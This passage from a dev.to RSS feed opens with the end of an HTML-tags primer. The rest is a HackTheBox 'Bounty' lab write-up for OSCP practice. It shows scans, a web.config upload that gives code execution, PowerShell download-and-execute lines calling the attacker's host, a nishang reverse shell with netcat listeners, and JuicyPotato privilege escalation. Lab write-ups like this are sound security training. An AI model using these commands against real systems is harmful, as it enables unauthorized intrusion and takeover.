&lt;strong&gt;&amp;lt;tr&amp;gt;&lt;/strong&gt;: (table row) for creating a row in your table&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;video&amp;gt;&lt;/strong&gt;: for displaying a video in your document.&lt;/li&gt;
&lt;li&gt;&amp;lt;img /&amp;gt;: for displaying an image in your document.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;ol&amp;gt;&lt;/strong&gt;: for creating an ordered list. &lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;ul&amp;gt;&lt;/strong&gt;: for creating an unordered list. &lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;li&amp;gt;&lt;/strong&gt;: for creating an item of a list.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#reference"&gt;
  &lt;/a&gt;
  Reference
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.w3schools.com/TAGS/default.ASP"&gt;www.w3schools.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Have a great day!&lt;/p&gt;

</description>
      <category>html</category>
      <category>webdev</category>
      <category>beginners</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>Writeup: HackTheBox Bounty - Without Metasploit (OSCP Prep)
</title>
      <author>Chris 'Huey' S</author>
      <pubDate>Tue, 14 Sep 2021 23:29:18 +0000</pubDate>
      <link>https://dev.to/0xhuey/writeup-hackthebox-bounty-without-metasploit-oscp-prep-1bga</link>
      <guid>https://dev.to/0xhuey/writeup-hackthebox-bounty-without-metasploit-oscp-prep-1bga</guid>
      <description>&lt;p&gt;Hello All,&lt;/p&gt;

&lt;p&gt;Just did Bounty from Hackthebox and would like to share my walk-through of the box.&lt;/p&gt;

&lt;p&gt;Let's Start!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;nmap -sC -sV -O -oN nmap.txt -p- -T4 10.10.10.93&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;-sC = Default Scripts&lt;/li&gt;
&lt;li&gt;-sV = Probe open ports to determine service/Versions info&lt;/li&gt;
&lt;li&gt;-T4 = Set timing for faster output (0-5)&lt;/li&gt;
&lt;li&gt;-oN = Output to save it to a file&lt;/li&gt;
&lt;li&gt;-p- = Scan all 65535 ports&lt;/li&gt;
&lt;li&gt;-O  = Operating System Detection&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--usB_nHL2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fgmdm4izgfmola7bdde5.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--usB_nHL2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fgmdm4izgfmola7bdde5.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#ports-open"&gt;
  &lt;/a&gt;
  Ports Open:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;80 HTTP Microsoft IIS httpD 7.5&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Let's run a &lt;strong&gt;vuln&lt;/strong&gt; scan really quick to see if anything comes up.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;nmap --script vuln -oN vuln.txt 10.10.10.93&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YmVh0QGw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/p8t67q3tz1cgnvnhbt17.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YmVh0QGw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/p8t67q3tz1cgnvnhbt17.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Nothing too interesting here for us, so let's move on.&lt;/p&gt;

&lt;p&gt;Heading over to the site, we are greeted with a Merlin landing page.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--X_ZihuB---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q2kvoalurxix1558wsv0.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--X_ZihuB---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q2kvoalurxix1558wsv0.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If we &lt;em&gt;right-click&lt;/em&gt; the site we see that there isn't much information here to gather.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SOu9SK27--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8tu4gjbu3jmdmce339p2.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SOu9SK27--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8tu4gjbu3jmdmce339p2.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I am going to run &lt;em&gt;dirb&lt;/em&gt; now to see if we can bust some directories.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Gobuster dir -u &lt;a href="http://10.10.10.93"&gt;http://10.10.10.93&lt;/a&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx, html, txt, conf, php&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;-x = This will find the file extension that might be on the site.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vmExsbPr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4n25recttebofnhdaowv.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vmExsbPr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4n25recttebofnhdaowv.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Focusing on the 2 files that I highlighted we can see that there is a &lt;em&gt;UploadedFiles&lt;/em&gt; and &lt;em&gt;Transfer.aspx&lt;/em&gt; location on the site.&lt;/p&gt;

&lt;p&gt;Heading back over to the site we can see there is a upload option on the site.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--14Z7AfQJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9nlzhi4j4jpfywqjpv67.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--14Z7AfQJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9nlzhi4j4jpfywqjpv67.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After playing around with the upload's button I figure out that I am able to upload a &lt;em&gt;config&lt;/em&gt; file to the site. Some further reading and I come across the following article that should allow me to get an RCE on the site.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/"&gt;link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Scrolling down to the bottom of the page we can see that the script is &lt;em&gt;adding&lt;/em&gt; 2+1 and should equal 3 once uploaded on the site. Give it a go and see if you are able to get it running.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--oooocAi8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/22lntqvvgqmucm18d8ho.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--oooocAi8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/22lntqvvgqmucm18d8ho.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;cat &amp;gt; web.config&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;nano web.config&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now copy + paste the code into the newly created file.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--M2Wq0YfP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3an14urrkmctzgo9ly2q.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--M2Wq0YfP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3an14urrkmctzgo9ly2q.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--XtVuSlWT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hi9kzev7ntyh115ssk8i.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--XtVuSlWT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hi9kzev7ntyh115ssk8i.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--M2tPPzSE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ii4coy0t40ikvk8u7grq.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--M2tPPzSE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ii4coy0t40ikvk8u7grq.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now after uploading the file head over to &lt;em&gt;uploadfiles/web.config&lt;/em&gt;!&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vRlTTWGH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/w6c1a958y1kuoso875q1.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vRlTTWGH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/w6c1a958y1kuoso875q1.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We are now going to create a Reverse shell that should allow us to get a interactive shell on the machine.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;echo &amp;gt; shell2.ps1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I am going to copy/paste the following nishang Reverse Shell in the newly created file &lt;a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"&gt;link&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;Now at the bottom of the &lt;strong&gt;shell2.ps1&lt;/strong&gt; script past the following:&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Invoke-PowerShellTCP -Reverse -IPAddress tun0 -Port 4444&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--tRVty5Rq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nasxj57nyi3tu6hq7etc.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--tRVty5Rq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nasxj57nyi3tu6hq7etc.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now within the &lt;em&gt;web.config&lt;/em&gt; edit the code to add the following:&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Set obj = CreateObject("WScript.Shell")&lt;br&gt;
obj.Exec("cmd /c powershell IEX(New-Object Net.Webclient).DownloadString('&lt;a href="http://tun0:80/shell2.ps1')%22"&gt;http://tun0:80/shell2.ps1')"&lt;/a&gt;)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mUEhfdA6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xstjbmhbqyli9ppnzinf.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mUEhfdA6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xstjbmhbqyli9ppnzinf.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;python -m SimpleHTTPServer 80&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This will serve over the file.&lt;/p&gt;

&lt;p&gt;Now lets start our Netcat listener.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;nc -nvlp 4444&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vwO7NuRI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vsxgtkdo1c74gjchqv13.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vwO7NuRI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vsxgtkdo1c74gjchqv13.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now upload the file to the site like you did before.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dVeqK4xT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1eost9fckzhwlp0w2edw.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dVeqK4xT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1eost9fckzhwlp0w2edw.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0k1UMy3B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3yf6ifu0db38vhid0q98.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0k1UMy3B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3yf6ifu0db38vhid0q98.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;whoami&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sb-TeH2X--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/96vbs8u85ln39tughuas.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sb-TeH2X--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/96vbs8u85ln39tughuas.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;systeminfo&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7MWL4yC1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ozdtm4cqg7hb0dfukxd4.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7MWL4yC1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ozdtm4cqg7hb0dfukxd4.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So it look's like we need to do a Priv Esc on the machine. After some digging I see that SeImpersonatePrivilege is enabled.&lt;/p&gt;

&lt;p&gt;I am going to grab &lt;strong&gt;JuciyPotato&lt;/strong&gt; and run it to see if we can do a priv esc. This blog &lt;a href="https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505"&gt;link&lt;/a&gt; provides a wealth of information on the tool.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;wget &lt;a href="https://github.com/ohpe/juciy-potato/release/download/v0.1/JuicyPotato.exe"&gt;https://github.com/ohpe/juciy-potato/release/download/v0.1/JuicyPotato.exe&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--eOVYS7PX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rikpenfbx04whwd3qgxr.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--eOVYS7PX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rikpenfbx04whwd3qgxr.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We will need to create a &lt;em&gt;bat&lt;/em&gt; file that calls to our Powershell script once again. This time we will change the Port number its calling out to.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;powershell -c IEX(New-Object Net.Webclient).Downloadstring('&lt;a href="http://tun0/Invoke-PowerShellTCP.ps1'"&gt;http://tun0/Invoke-PowerShellTCP.ps1'&lt;/a&gt;)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9h5m88F4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z5zjudfiam2ytmwhavy9.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9h5m88F4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z5zjudfiam2ytmwhavy9.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now update the &lt;em&gt;Invoke-PowerShellTCP.ps1&lt;/em&gt; script to switch the port number to &lt;strong&gt;5555&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--3WRLoGJn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/49hijkyadzmgmsnk1gv5.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--3WRLoGJn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/49hijkyadzmgmsnk1gv5.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now on the box let's move the script over.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;(new-object net.webclient).downloadfile('&lt;a href="http://tun0/JuicyPotato.exe"&gt;http://tun0/JuicyPotato.exe&lt;/a&gt;', 'C:\users\merlin\appdata\local\temp\JuicyPotato.exe')&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(new-object net.webclient).downloadfile('&lt;a href="http://tun0/shell.bat"&gt;http://tun0/shell.bat&lt;/a&gt;', 'C:\users\merlin\appdata\local\temp\shell.bat')&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EcwU4Bl9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/km7tm098d44zc20kiw8x.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EcwU4Bl9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/km7tm098d44zc20kiw8x.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;ls&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To confirm that this is sitting on the box.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--CSTPUd2C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vqy6zo1bwjhm1hucvaa5.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--CSTPUd2C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vqy6zo1bwjhm1hucvaa5.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Also your Python WebServer should display the files moved.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8_SaBVGA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y5dsfoy7a5kyntmjvhtg.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8_SaBVGA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y5dsfoy7a5kyntmjvhtg.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's fire up the &lt;em&gt;netcat listner&lt;/em&gt; again.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#command"&gt;
  &lt;/a&gt;
  Command:
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;nc -nvlp 5555&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YzdE0uUd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nv5z5bqyfy01rq332r0g.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YzdE0uUd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nv5z5bqyfy01rq332r0g.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now for the final steps let's run &lt;em&gt;JuicyPotato&lt;/em&gt; to see if we can upgrade our rights.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bUqFOnlP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rmc7v351z3foeccvqx39.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bUqFOnlP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rmc7v351z3foeccvqx39.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now head back over to the listener.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JjgvKXeg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3z107o5su71v66qx37zh.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JjgvKXeg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3z107o5su71v66qx37zh.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Boom looks like we are in!&lt;/p&gt;

&lt;p&gt;Let's grab the User/Root txt files. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jC6J2isc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0k7m879r2d9woak9c6vu.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jC6J2isc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0k7m879r2d9woak9c6vu.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ZCivUOww--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e6v599ovx1czdt4wcbpa.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ZCivUOww--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e6v599ovx1czdt4wcbpa.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>cybersecurity</category>
      <category>webdev</category>
      <category>python</category>
    </item>
    <item>
